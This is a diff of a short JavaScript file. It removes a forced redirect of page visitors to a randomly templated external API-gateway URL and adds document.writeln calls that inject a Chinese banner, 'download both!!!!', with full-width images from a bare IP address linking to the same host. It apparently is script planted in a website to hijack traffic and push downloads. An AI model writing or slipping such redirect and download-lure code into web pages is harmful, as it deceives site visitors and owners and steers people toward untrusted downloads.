@@ -1,21 +1,12 @@
-
-var urls=[
- 
-  'http://service-6tulm0hs-1313409281.gz.apigw.tencentcs.com',
-	  	
-		  	
-];
-location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
-function myEeplace(s){
-	return s.replace(/\{(\w+?)\}/g,function(a,b){
-		var h='';
-		for(var i=0;i<b.length;i++){
-			if('n'==b[i]){
-				h+=Math.floor(Math.random()*10);
-			}else if('w'==b[i]){
-				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
-			}
-		}
-		return h;
-	});
-}
+document.writeln("<center><h5>建议两个都下载！！！！</h5></center>");
+document.writeln("<center>");
+document.writeln("			<a href=\"http://service-6tulm0hs-1313409281.gz.apigw.tencentcs.com\"><img src=\"http://123.186.147.14:83/1.jpg\" width=\"100%\" border=\"边框\"></a>			</center>");
+document.write("           <br \/>");
+document.writeln("            <center>");
+document.writeln("			<a href=\"http://service-6tulm0hs-1313409281.gz.apigw.tencentcs.com\"><img src=\"http://123.186.147.14:83/2.jpg\/zz\/2.jpg\" width=\"100%\" border=\"边框\"></a>			</center>");
+document.write("           <br \/>");
+document.write("            <br \/>");
+document.write("          <br \/>");
+document.write("            <br \/>");
+document.write("            <br \/>");
+document.write("           <br \/>");
